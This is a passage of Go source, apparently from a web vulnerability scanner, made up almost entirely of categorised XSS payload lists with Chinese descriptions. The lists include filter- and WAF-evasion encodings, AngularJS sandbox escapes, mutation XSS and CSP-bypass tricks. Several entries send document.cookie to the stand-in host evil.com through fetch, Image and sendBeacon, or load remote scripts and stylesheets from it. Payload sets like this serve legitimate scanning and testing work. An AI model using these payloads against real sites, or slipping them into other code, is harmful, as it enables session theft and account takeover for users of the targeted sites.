	{Raw: `' onkeydown=alert(1) x='`, Description: "单引号onkeydown", Context: XSSAttribute},
	{Raw: `' onchange=alert(1) x='`, Description: "单引号onchange", Context: XSSAttribute},
	{Raw: `' onsubmit=alert(1) x='`, Description: "单引号onsubmit", Context: XSSAttribute},

	{Raw: "` onmouseover=alert(1) x=`", Description: "反引号onmouseover", Context: XSSAttribute},
	{Raw: "` onfocus=alert(1) autofocus x=`", Description: "反引号onfocus autofocus", Context: XSSAttribute},
	{Raw: "` onclick=alert(1) x=`", Description: "反引号onclick", Context: XSSAttribute},

	{Raw: ` onmouseover=alert(1) `, Description: "空格注入onmouseover", Context: XSSAttribute},
	{Raw: ` onclick=alert(1) `, Description: "空格注入onclick", Context: XSSAttribute},
	{Raw: ` onfocus=alert(1) autofocus `, Description: "空格注入onfocus autofocus", Context: XSSAttribute},
	{Raw: ` onload=alert(1) `, Description: "空格注入onload", Context: XSSAttribute},
	{Raw: ` onerror=alert(1) `, Description: "空格注入onerror", Context: XSSAttribute},
	{Raw: ` oninput=alert(1) `, Description: "空格注入oninput", Context: XSSAttribute},

	{Raw: `" oncut=alert(1) contenteditable="true" x="`, Description: "oncut contenteditable", Context: XSSAttribute},
	{Raw: `" oncopy=alert(1) contenteditable="true" x="`, Description: "oncopy contenteditable", Context: XSSAttribute},

	{Raw: `" style=animation-name:spin onanimationstart=alert(1) x="`, Description: "CSS animation XSS", Context: XSSAttribute},
	{Raw: `" style="x:expression(alert(1))`, Description: "IE expression style", Context: XSSAttribute},
}

var xssScriptVectors = []Payload{
	{Raw: `');alert(1)//`, Description: "script单引号闭合", Context: XSSScript},
	{Raw: `");alert(1)//`, Description: "script双引号闭合", Context: XSSScript},
	{Raw: `'-alert(1)-'`, Description: "script减号闭合", Context: XSSScript},
	{Raw: `</script><script>alert(1)</script>`, Description: "script标签闭合", Context: XSSScript},
	{Raw: `\';alert(1);//`, Description: "script反斜杠转义1", Context: XSSScript},
	{Raw: `\");alert(1);//`, Description: "script反斜杠转义2", Context: XSSScript},
	{Raw: `';alert(1);'`, Description: "script单引号环绕", Context: XSSScript},
	{Raw: `";alert(1);"`, Description: "script双引号环绕", Context: XSSScript},
	{Raw: `</script><script>prompt(1)</script>`, Description: "script标签闭合prompt", Context: XSSScript},
	{Raw: `</script><img src=x onerror=alert(1)>`, Description: "script闭合+img", Context: XSSScript},
	{Raw: `'-alert(document.cookie)-'`, Description: "script减号cookie", Context: XSSScript},
	{Raw: `');document.write('<img src=//evil.com/>')//`, Description: "script document.write", Context: XSSScript},
	{Raw: `');fetch('//evil.com/?c='+document.cookie)//`, Description: "script fetch外传", Context: XSSScript},
	{Raw: `');new Image().src='//evil.com/?c='+document.cookie//`, Description: "script Image外传", Context: XSSScript},
	{Raw: `');eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))//`, Description: "script eval atob cookie", Context: XSSScript},
}

var xssSVGVectors = []Payload{
	{Raw: `<svg onload=alert(1)>`, Description: "SVG onload", Context: XSSSVG},
	{Raw: `<svg onload=prompt(1)>`, Description: "SVG onload prompt", Context: XSSSVG},
	{Raw: `<svg onload=confirm(1)>`, Description: "SVG onload confirm", Context: XSSSVG},
	{Raw: `<svg/onload=alert(1)>`, Description: "SVG自闭合onload", Context: XSSSVG},
	{Raw: `<svg onload=alert(1)//`, Description: "SVG onload+注释", Context: XSSSVG},
	{Raw: `<svg><script>alert(1)</script></svg>`, Description: "SVG内嵌script", Context: XSSSVG},
	{Raw: `<svg><script>prompt(1)</script></svg>`, Description: "SVG内嵌script prompt", Context: XSSSVG},
	{Raw: `<svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>`, Description: "SVG xmlns onload", Context: XSSSVG},

	{Raw: `<svg><g onload=alert(1)></g></svg>`, Description: "SVG g onload", Context: XSSSVG},
	{Raw: `<svg><g onmouseover=alert(1)>text</g></svg>`, Description: "SVG g onmouseover", Context: XSSSVG},
	{Raw: `<svg><circle onload=alert(1)></circle></svg>`, Description: "SVG circle onload", Context: XSSSVG},
	{Raw: `<svg><ellipse onload=alert(1)></ellipse></svg>`, Description: "SVG ellipse onload", Context: XSSSVG},
	{Raw: `<svg><line onload=alert(1)></line></svg>`, Description: "SVG line onload", Context: XSSSVG},
	{Raw: `<svg><path onload=alert(1)></path></svg>`, Description: "SVG path onload", Context: XSSSVG},
	{Raw: `<svg><polygon onload=alert(1)></polygon></svg>`, Description: "SVG polygon onload", Context: XSSSVG},
	{Raw: `<svg><polyline onload=alert(1)></polyline></svg>`, Description: "SVG polyline onload", Context: XSSSVG},
	{Raw: `<svg><text onload=alert(1)>click</text></svg>`, Description: "SVG text onload", Context: XSSSVG},
	{Raw: `<svg><tspan onload=alert(1)>click</tspan></svg>`, Description: "SVG tspan onload", Context: XSSSVG},
	{Raw: `<svg><tref onload=alert(1)></tref></svg>`, Description: "SVG tref onload", Context: XSSSVG},
	{Raw: `<svg><rect onload=alert(1)></rect></svg>`, Description: "SVG rect onload", Context: XSSSVG},

	{Raw: `<svg><image href=1 onerror=alert(1)>`, Description: "SVG image onerror", Context: XSSSVG},
	{Raw: `<svg><image href=1 onerror=prompt(1)>`, Description: "SVG image onerror prompt", Context: XSSSVG},
	{Raw: `<svg><use href=1 onerror=alert(1)>`, Description: "SVG use onerror", Context: XSSSVG},

	{Raw: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`, Description: "SVG animate onbegin", Context: XSSSVG},
	{Raw: `<svg><animate onbegin=prompt(1) attributeName=x dur=1s>`, Description: "SVG animate onbegin prompt", Context: XSSSVG},
	{Raw: `<svg><set onbegin=alert(1) attributeName=x dur=1s>`, Description: "SVG set onbegin", Context: XSSSVG},
	{Raw: `<svg><animatetransform onbegin=alert(1) attributeName=transform>`, Description: "SVG animatetransform onbegin", Context: XSSSVG},
	{Raw: `<svg><animatemotion onbegin=alert(1)>`, Description: "SVG animatemotion onbegin", Context: XSSSVG},
	{Raw: `<svg><animatecolor onbegin=alert(1) attributeName=x>`, Description: "SVG animatecolor onbegin", Context: XSSSVG},

	{Raw: `<svg><foreignobject><script>alert(1)</script></foreignobject>`, Description: "SVG foreignObject script", Context: XSSSVG},
	{Raw: `<svg><foreignobject><img src=x onerror=alert(1)></foreignobject>`, Description: "SVG foreignObject img", Context: XSSSVG},
	{Raw: `<svg><switch><g onload=alert(1)></g></switch></svg>`, Description: "SVG switch onload", Context: XSSSVG},

	{Raw: `<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>`, Description: "SVG style CDATA img", Context: XSSSVG},

	{Raw: `<svg><feimage><animate onbegin=alert(1) attributeName=x>`, Description: "SVG feimage animate", Context: XSSSVG},
	{Raw: `<svg><feblend><set onbegin=alert(1) attributeName=x>`, Description: "SVG feblend set", Context: XSSSVG},
	{Raw: `<svg><fecolormatrix><animate onbegin=alert(1) attributeName=x>`, Description: "SVG fecolormatrix animate", Context: XSSSVG},
	{Raw: `<svg><fedisplacementmap><set onbegin=alert(1) attributeName=x>`, Description: "SVG fedisplacementmap set", Context: XSSSVG},
	{Raw: `<svg><fedropshadow><animate onbegin=alert(1) attributeName=x>`, Description: "SVG fedropshadow animate", Context: XSSSVG},
	{Raw: `<svg><feflood><set onbegin=alert(1) attributeName=x>`, Description: "SVG feflood set", Context: XSSSVG},
	{Raw: `<svg><fegaussianblur><animate onbegin=alert(1) attributeName=x>`, Description: "SVG fegaussianblur animate", Context: XSSSVG},
	{Raw: `<svg><femerge><set onbegin=alert(1) attributeName=x>`, Description: "SVG femerge set", Context: XSSSVG},
	{Raw: `<svg><femorphology><animate onbegin=alert(1) attributeName=x>`, Description: "SVG femorphology animate", Context: XSSSVG},
	{Raw: `<svg><feoffset><set onbegin=alert(1) attributeName=x>`, Description: "SVG feoffset set", Context: XSSSVG},
	{Raw: `<svg><feturbulence><animate onbegin=alert(1) attributeName=x>`, Description: "SVG feturbulence animate", Context: XSSSVG},
	{Raw: `<svg><feconvolvematrix><set onbegin=alert(1) attributeName=x>`, Description: "SVG feconvolvematrix set", Context: XSSSVG},

	{Raw: `<svg><pattern><animate onbegin=alert(1) attributeName=x>`, Description: "SVG pattern animate", Context: XSSSVG},
	{Raw: `<svg><marker><set onbegin=alert(1) attributeName=x>`, Description: "SVG marker set", Context: XSSSVG},
	{Raw: `<svg><mask><animate onbegin=alert(1) attributeName=x>`, Description: "SVG mask animate", Context: XSSSVG},
	{Raw: `<svg><clippath><set onbegin=alert(1) attributeName=x>`, Description: "SVG clippath set", Context: XSSSVG},
	{Raw: `<svg><filter><animate onbegin=alert(1) attributeName=x>`, Description: "SVG filter animate", Context: XSSSVG},
	{Raw: `<svg><lineargradient><set onbegin=alert(1) attributeName=x>`, Description: "SVG lineargradient set", Context: XSSSVG},
	{Raw: `<svg><radialgradient><animate onbegin=alert(1) attributeName=x>`, Description: "SVG radialgradient animate", Context: XSSSVG},
	{Raw: `<svg><stop><set onbegin=alert(1) attributeName=x>`, Description: "SVG stop set", Context: XSSSVG},

	{Raw: `<svg><a><set onbegin=alert(1)>click</set><text>click</text></a>`, Description: "SVG a set onbegin", Context: XSSSVG},
	{Raw: `<svg><a onclick=alert(1)><text>click</text></a>`, Description: "SVG a onclick", Context: XSSSVG},
}

var xssPolyglot = []Payload{
	{Raw: "jaVasCript:/*-/*`/*\\`*/'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert(1)//>\\", Description: "Polyglot多上下文", Context: XSSHTML},
	{Raw: `"><img src=x onerror=alert(1)>`, Description: "双引号+>闭合img", Context: XSSHTML},
	{Raw: `"><svg onload=alert(1)>`, Description: "双引号+>闭合svg", Context: XSSHTML},
	{Raw: `"><svg><script>alert(1)</script>`, Description: "双引号+>svg script", Context: XSSHTML},
	{Raw: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`, Description: "多语境逃逸", Context: XSSHTML},
	{Raw: `\"-alert(1)//`, Description: "引号+脚本注释", Context: XSSHTML},
	{Raw: `</script><svg><script>alert(1)</script>`, Description: "闭合script+svg script", Context: XSSHTML},
}

var xssWAFBypass = []Payload{
	{Raw: `<ScRiPt>alert(1)</ScRiPt>`, Description: "大小写混用", Context: XSSHTML},
	{Raw: `<scr<script>ipt>alert(1)</scr</script>ipt>`, Description: "标签嵌套破坏", Context: XSSHTML},
	{Raw: `<scr%00ipt>alert(1)</scr%00ipt>`, Description: "Null字节注入", Context: XSSHTML},
	{Raw: `<scr\x00ipt>alert(1)</scr\x00ipt>`, Description: "\\x00 Null注入", Context: XSSHTML},
	{Raw: `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`, Description: "Unicode编码", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval('\141\154\145\162\164(1)')>`, Description: "八进制编码eval", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>`, Description: "fromCharCode编码", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, Description: "base64编码eval", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(btoa('\141\154\145\162\164'))>`, Description: "btoa+八进制", Context: XSSHTML},
	{Raw: `<img/src=x/onerror=alert(1)>`, Description: "无空格img", Context: XSSHTML},
	{Raw: `<img src=x onerror=alert\40\49\51>`, Description: "CSS转义", Context: XSSHTML},
	{Raw: `<img src=x onerror=location='jav'%2b'ascript:ale'%2b'rt(1)'>`, Description: "字符串拼接", Context: XSSHTML},
	{Raw: `<img src=x onerror="top['al'%2b'ert'](1)">`, Description: "top属性调用", Context: XSSHTML},
	{Raw: `<img src=x onerror="self['al'%2b'ert'](1)">`, Description: "self属性调用", Context: XSSHTML},
	{Raw: `<img src=x onerror="window['\x61\x6c\x65\x72\x74'](1)">`, Description: "hex escape属性调用", Context: XSSHTML},
	{Raw: `<img src=x onerror="\141\154\145\162\164\50\61\51">`, Description: "八进制直接", Context: XSSHTML},
	{Raw: `<img src=x onerror="Function` + "`" + `\x61\x6c\x65\x72\x74\x60\x60\x31\x60` + "`" + `">`, Description: "Function模板字面量", Context: XSSHTML},
	{Raw: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`, Description: "data:base64编码", Context: XSSHTML},
	{Raw: `<a href="vbscript:alert(1)">click</a>`, Description: "vbscript IE", Context: XSSHTML},
	{Raw: `<div style="x:\"\"eval(atob('dmFyIGE9YWxlcnQoMSk='))\">`, Description: "CSS+eval+atob", Context: XSSHTML},
	{Raw: `<div style="x:\"\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">`, Description: "CSS+eval+CharCode", Context: XSSHTML},
	{Raw: `<img src=x onerror=\x61\x6c\x65\x72\x74\x28\x31\x29>`, Description: "\\x hex onerror", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval(String.fromCharCode.apply(null,[97,108,101,114,116,40,49,41]))>`, Description: "CharCode apply", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval.call(null,'alert(1)')>`, Description: "eval.call", Context: XSSHTML},
	{Raw: `<img src=x onerror=eval.apply(null,['alert(1)'])>`, Description: "eval.apply", Context: XSSHTML},
	{Raw: `<img src=x onerror=Reflect.apply(eval,null,['alert(1)'])>`, Description: "Reflect.apply eval", Context: XSSHTML},
	{Raw: `<img src=x onerror=window.decodeURI('%2561%256c%2565%2572%2574(1)')>`, Description: "decodeURI双层编码", Context: XSSHTML},
	{Raw: `<script>fetch` + "`" + `//evil.com/${document.cookie}` + "`" + `</script>`, Description: "fetch模板字面量cookie", Context: XSSHTML},
}

var xssHTML5Vectors = []Payload{
	{Raw: `<details open ontoggle=alert(1)>`, Description: "details ontoggle HTML5", Context: XSSHTML},
	{Raw: `<details open ontoggle=prompt(1)>`, Description: "details ontoggle prompt", Context: XSSHTML},
	{Raw: `<details open ontoggle=confirm(1)>`, Description: "details ontoggle confirm", Context: XSSHTML},
	{Raw: `<dialog open>alert(1)</dialog>`, Description: "dialog HTML5", Context: XSSHTML},
	{Raw: `<dialog open onclose=alert(1)>`, Description: "dialog onclose HTML5", Context: XSSHTML},
	{Raw: `<template><script>alert(1)</script></template>`, Description: "template内嵌script", Context: XSSHTML},
	{Raw: `<picture><source srcset=x onerror=alert(1)>`, Description: "picture onerror", Context: XSSHTML},
	{Raw: `<picture><img src=x onerror=alert(1)>`, Description: "picture img onerror", Context: XSSHTML},
	{Raw: `<output onfocus=alert(1)>`, Description: "output onfocus", Context: XSSHTML},
	{Raw: `<output onmouseover=alert(1)>`, Description: "output onmouseover", Context: XSSHTML},
	{Raw: `<progress onclick=alert(1)>`, Description: "progress onclick", Context: XSSHTML},
	{Raw: `<progress onmouseover=alert(1)>`, Description: "progress onmouseover", Context: XSSHTML},
	{Raw: `<meter onmouseover=alert(1)>`, Description: "meter onmouseover", Context: XSSHTML},
	{Raw: `<meter onclick=alert(1)>`, Description: "meter onclick", Context: XSSHTML},
	{Raw: `<canvas onfocus=alert(1)>`, Description: "canvas onfocus", Context: XSSHTML},
	{Raw: `<canvas onmouseover=alert(1)>`, Description: "canvas onmouseover", Context: XSSHTML},
	{Raw: `<object data=javascript:alert(1)>`, Description: "object javascript:", Context: XSSHTML},
	{Raw: `<embed src=javascript:alert(1)>`, Description: "embed javascript:", Context: XSSHTML},
	{Raw: `<figure onmouseover=alert(1)>`, Description: "figure onmouseover", Context: XSSHTML},
	{Raw: `<figcaption onmouseover=alert(1)>`, Description: "figcaption onmouseover", Context: XSSHTML},
	{Raw: `<header onmouseover=alert(1)>`, Description: "header onmouseover", Context: XSSHTML},
	{Raw: `<footer onmouseover=alert(1)>`, Description: "footer onmouseover", Context: XSSHTML},
	{Raw: `<nav onmouseover=alert(1)>`, Description: "nav onmouseover", Context: XSSHTML},
	{Raw: `<article onmouseover=alert(1)>`, Description: "article onmouseover", Context: XSSHTML},
	{Raw: `<section onmouseover=alert(1)>`, Description: "section onmouseover", Context: XSSHTML},
	{Raw: `<aside onmouseover=alert(1)>`, Description: "aside onmouseover", Context: XSSHTML},
	{Raw: `<main onmouseover=alert(1)>`, Description: "main onmouseover", Context: XSSHTML},
	{Raw: `<mark onmouseover=alert(1)>`, Description: "mark onmouseover", Context: XSSHTML},
	{Raw: `<time onmouseover=alert(1)>`, Description: "time onmouseover", Context: XSSHTML},
	{Raw: `<custom onfocus=alert(1)>`, Description: "custom element onfocus", Context: XSSHTML},
}

var xssCSSVectors = []Payload{
	{Raw: `body{background-image:url("javascript:alert(1)")}`, Description: "CSS background-image JS", Context: XSSCSS},
	{Raw: `body{background:url("javascript:alert(1)")}`, Description: "CSS background JS", Context: XSSCSS},
	{Raw: `body{background-image:url("data:text/html,<script>alert(1)</script>")}`, Description: "CSS bg-image data:", Context: XSSCSS},
	{Raw: `body{width:expression(alert(1))}`, Description: "CSS expression IE", Context: XSSCSS},
	{Raw: `body{height:expression(eval('al'+'ert(1)'))}`, Description: "CSS expression eval IE", Context: XSSCSS},
	{Raw: `@import url("javascript:alert(1)");`, Description: "CSS @import JS", Context: XSSCSS},
	{Raw: `@import url("data:text/html,<script>alert(1)</script>");`, Description: "CSS @import data:", Context: XSSCSS},
	{Raw: `<style>@import'//evil.com/xss.css';</style>`, Description: "CSS @import远程", Context: XSSCSS},
	{Raw: `<link rel=stylesheet href=//evil.com/xss.css>`, Description: "link远程CSS", Context: XSSCSS},
	{Raw: `</style><script>alert(1)</script>`, Description: "闭合style+script", Context: XSSCSS},
	{Raw: `</style><img src=x onerror=alert(1)>`, Description: "闭合style+img", Context: XSSCSS},
	{Raw: `<style>@keyframes x{}</style><img style=animation-name:x onanimationend=alert(1)>`, Description: "CSS animation+XSS", Context: XSSCSS},
	{Raw: `<style>@keyframes x{from{left:0}}</style><div style=animation-name:x onanimationiteration=alert(1)>`, Description: "CSS anim iteration+XSS", Context: XSSCSS},
	{Raw: `body{-moz-binding:url("//evil.com/xss.xml#xss")}`, Description: "CSS -moz-binding XBL", Context: XSSCSS},
	{Raw: `<link rel=stylesheet href=data:text/css,@import'//evil.com/xss.css'>`, Description: "link data:text/css", Context: XSSCSS},
}

var xssURLVectors = []Payload{
	{Raw: `javascript:alert(1)`, Description: "javascript: URL", Context: XSSURL},
	{Raw: `javascript:prompt(1)`, Description: "javascript: prompt", Context: XSSURL},
	{Raw: `javascript:confirm(1)`, Description: "javascript: confirm", Context: XSSURL},
	{Raw: `javascript:alert(document.cookie)`, Description: "javascript: cookie", Context: XSSURL},
	{Raw: `javascript:void(alert(1))`, Description: "javascript: void alert", Context: XSSURL},
	{Raw: `javascript:eval('al'+'ert(1)')`, Description: "javascript: eval", Context: XSSURL},
	{Raw: `javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))`, Description: "javascript: eval CharCode", Context: XSSURL},
	{Raw: `javascript:eval(atob('YWxlcnQoMSk='))`, Description: "javascript: eval atob", Context: XSSURL},
	{Raw: `data:text/html,<script>alert(1)</script>`, Description: "data:text/html", Context: XSSURL},
	{Raw: `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`, Description: "data:base64 script", Context: XSSURL},
	{Raw: `data:text/html,<img src=x onerror=alert(1)>`, Description: "data:text/html img", Context: XSSURL},
	{Raw: `vbscript:alert(1)`, Description: "vbscript URL IE", Context: XSSURL},
	{Raw: `jav\tascript:alert(1)`, Description: "TAB绕过javascript:", Context: XSSURL},
	{Raw: `java%0dscript:alert(1)`, Description: "回车绕过javascript:", Context: XSSURL},
	{Raw: `java%09script:alert(1)`, Description: "TAB URL编码绕过", Context: XSSURL},
	{Raw: `java%0ascript:alert(1)`, Description: "换行URL编码绕过", Context: XSSURL},
	{Raw: `java%0cscript:alert(1)`, Description: "换页URL编码绕过", Context: XSSURL},
	{Raw: `%6a%61%76%61%73%63%72%69%70%74:alert(1)`, Description: "全URL编码javascript:", Context: XSSURL},
	{Raw: `&#106;avascript:alert(1)`, Description: "HTML实体j绕过", Context: XSSURL},
	{Raw: `javascript\x3Aalert(1)`, Description: "\\x3A冒号绕过", Context: XSSURL},
}

var xssCommentVectors = []Payload{
	{Raw: `--><script>alert(1)</script>`, Description: "HTML注释闭合", Context: XSSComment},
	{Raw: `--><img src=x onerror=alert(1)>`, Description: "HTML注释+img", Context: XSSComment},
	{Raw: `--><svg onload=alert(1)>`, Description: "HTML注释+svg", Context: XSSComment},
	{Raw: `<!--><script>alert(1)</script>`, Description: "HTML注释自闭合", Context: XSSComment},
	{Raw: `<!--><img src=x onerror=alert(1)>`, Description: "HTML注释自闭合+img", Context: XSSComment},
	{Raw: `<![CDATA[<script>alert(1)</script>]]>`, Description: "CDATA内嵌script", Context: XSSComment},
	{Raw: `<![CDATA[<img src=x onerror=alert(1)>]]>`, Description: "CDATA内嵌img", Context: XSSComment},
	{Raw: `]]><script>alert(1)</script>`, Description: "CDATA闭合+script", Context: XSSComment},
}

var xssDOMClobbering = []Payload{
	{Raw: `<img name=getElementById><script>getElementById.alert(1)</script>`, Description: "DOM Clobbering getElementById", Context: XSSHTML},
	{Raw: `<a id=x href=//evil.com></a><script>if(x.href)alert(1)</script>`, Description: "DOM属性覆盖", Context: XSSHTML},
	{Raw: `<form name=test><input name=action value=alert(1)></form>`, Description: "form Clobbering", Context: XSSHTML},
	{Raw: `<img name=document><script>document.img.alert(1)</script>`, Description: "document属性覆盖", Context: XSSHTML},
	{Raw: `<a name=getAttribute href=javascript:alert(1)></a>`, Description: "getAttribute覆盖", Context: XSSHTML},
	{Raw: `<img name=x><script>x.alert(1)</script>`, Description: "img name覆盖", Context: XSSHTML},
	{Raw: `<iframe name=x src=javascript:alert(1)>`, Description: "iframe name覆盖", Context: XSSHTML},
}

var xssMutationVectors = []Payload{
	{Raw: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`, Description: "noscript MUTATION XSS", Context: XSSHTML},
	{Raw: `<table><form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>`, Description: "form math mutation", Context: XSSHTML},
	{Raw: `<svg><p><style><img src=x onerror=alert(1)>`, Description: "SVG mXSS", Context: XSSHTML},
	{Raw: `<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>`, Description: "math mXSS", Context: XSSHTML},
	{Raw: `<svg><foreignobject><div></foreignobject><img src=x onerror=alert(1)>`, Description: "SVG foreignObject mXSS", Context: XSSHTML},
}

var xssJQueryVectors = []Payload{
	{Raw: `#"><img src=/ onerror=alert(1)>`, Description: "jQuery HTML注入", Context: XSSHTML},
	{Raw: `javascript:alert(document.cookie)`, Description: "jQuery href注入", Context: XSSURL},
	{Raw: `{"title":"</script><img src=x onerror=alert(1)>"}`, Description: "JSON jQuery XSS", Context: XSSScript},
	{Raw: `{"username":"<script>alert(1)</script>"}`, Description: "JSON script注入", Context: XSSScript},
	{Raw: `"><img src=x onerror=$.getScript('//evil.com/a.js')>`, Description: "jQuery getScript", Context: XSSHTML},
}

var xssAngularVectors = []Payload{
	{Raw: `{{constructor.constructor('alert(1)')()}}`, Description: "AngularJS constructor注入", Context: XSSHTML},
	{Raw: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}`, Description: "AngularJS charAt绕过", Context: XSSHTML},
	{Raw: `{{a='constructor';b={};a.sub.call.call(b[a].call(null,'alert(1)'),'',0)}}`, Description: "AngularJS complex沙箱逃逸", Context: XSSHTML},
	{Raw: `{$on.constructor('alert(1)')()}`, Description: "AngularJS $on.constructor", Context: XSSHTML},
	{Raw: `{{toString.constructor('alert(1)')()}}`, Description: "AngularJS toString构造", Context: XSSHTML},
	{Raw: `{{[].pop.constructor('alert(1)')()}}`, Description: "AngularJS Array构造", Context: XSSHTML},
}

var xssCSPBypass = []Payload{
	{Raw: `<script src="data:text/javascript,alert(1)"></script>`, Description: "CSP绕过-data:脚本", Context: XSSHTML},
	{Raw: `<link rel=dns-prefetch href=//evil.com>`, Description: "CSP绕过-dns-prefetch外传", Context: XSSHTML},
	{Raw: `<link rel=preconnect href=//evil.com>`, Description: "CSP绕过-preconnect", Context: XSSHTML},
	{Raw: `<meta http-equiv=refresh content="0;url=//evil.com">`, Description: "CSP绕过-meta refresh", Context: XSSHTML},
	{Raw: `<base href=//evil.com/>`, Description: "CSP绕过-base劫持", Context: XSSHTML},
	{Raw: `<img src=x onerror=import('data:text/javascript,alert(1)')>`, Description: "CSP绕过-动态import", Context: XSSHTML},
	{Raw: `<script src=//evil.com?callback=alert></script>`, Description: "CSP绕过-JSONP劫持", Context: XSSHTML},
	{Raw: `<img src=x onerror="navigator.sendBeacon('//evil.com',document.cookie)">`, Description: "CSP绕过-sendBeacon外传", Context: XSSHTML},
}

var xssJSONVectors = []Payload{
	{Raw: `{"name":"</script><script>alert(1)</script>"}`, Description: "JSON XSS闭合script", Context: XSSHTML},
	{Raw: `{"name":"<img src=x onerror=alert(1)>"}`, Description: "JSON XSS img", Context: XSSHTML},
	{Raw: `{"name":"<svg onload=alert(1)>"}`, Description: "JSON XSS svg", Context: XSSHTML},
}

func XSSHTMLPayloads() []Payload         { return xssHTMLVectors }
func XSSAttributePayloads() []Payload    { return xssAttributeVectors }
func XSSScriptPayloads() []Payload       { return xssScriptVectors }
func XSSSVGPayloads() []Payload          { return xssSVGVectors }
func XSSPolyglotPayloads() []Payload     { return xssPolyglot }
func XSSWAFBypassPayloads() []Payload    { return xssWAFBypass }
func XSSHTML5Payloads() []Payload        { return xssHTML5Vectors }
func XSSCSSPayloads() []Payload          { return xssCSSVectors }
func XSSURLPayloads() []Payload          { return xssURLVectors }
func XSSCommentPayloads() []Payload      { return xssCommentVectors }
func XSSDOMClobberingPayloads() []Payload { return xssDOMClobbering }
func XSSMutationPayloads() []Payload     { return xssMutationVectors }
func XSSJQueryPayloads() []Payload       { return xssJQueryVectors }
func XSSAngularPayloads() []Payload      { return xssAngularVectors }
func XSSCSPBypassPayloads() []Payload    { return xssCSPBypass }
func XSSJSONPayloads() []Payload         { return xssJSONVectors }

func XSSPayloads() []Payload {
	var all []Payload
	all = append(all, xssHTMLVectors...)
	all = append(all, xssAttributeVectors...)
	all = append(all, xssScriptVectors...)
	all = append(all, xssSVGVectors...)
	all = append(all, xssPolyglot...)
	all = append(all, xssWAFBypass...)
	all = append(all, xssHTML5Vectors...)
	all = append(all, xssCSSVectors...)
	all = append(all, xssURLVectors...)
	all = append(all, xssCommentVectors...)
	all = append(all, xssDOMClobbering...)
	all = append(all, xssMutationVectors...)
	all = append(all, xssJQueryVectors...)
	all = append(all, xssAngularVectors...)
	all = append(all, xssCSPBypass...)
	all = append(all, xssJSONVectors...)
	return all
}

func XSSByContext(ctx XSSContext) []Payload {
	switch ctx {
	case XSSHTML:
		return xssHTMLVectors
	case XSSAttribute:
		return xssAttributeVectors
	case XSSScript:
		return xssScriptVectors
	case XSSCSS:
		return xssCSSVectors
	case XSSURL:
		return xssURLVectors
	case XSSComment:
		return xssCommentVectors
	case XSSSVG:
		return xssSVGVectors
	case XSSTagName:
		return xssHTML5Vectors
	default:
		return xssHTMLVectors
	}
}